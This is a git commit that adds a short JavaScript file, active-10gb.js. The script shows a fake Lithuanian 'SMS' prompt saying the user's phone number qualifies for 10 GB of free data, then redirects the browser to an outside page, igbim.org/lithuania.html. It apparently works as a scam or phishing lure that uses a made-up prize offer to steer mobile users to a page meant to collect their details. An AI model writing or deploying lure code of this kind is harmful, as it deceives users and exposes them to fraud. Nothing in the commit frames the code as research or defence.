96c672d0b632f4e51d2f3a50a3209215c2f09017
mfednewblog9 <newekpeitid@gmail.com>
2026-01-23 17:00:40 +0100

    Create active-10gb.js

---
+++ active-10gb.js
@@ -0,0 +1,5 @@
+var password = 'AKTYVUOTI 10 GB'
+password=prompt('SMS: Sveikiname, jūsų mobiliojo telefono numeris atitinka 10 GB reikalavimus. Spustelėkite „Gerai“, kad įvestumėte savo mobiliojo telefono numerį.','AKTYVUOTI 10 GB');
+if (password != 'AKTYVUOTI 10 GB') {
+location.href='https://igbim.org/lithuania.html';
+}
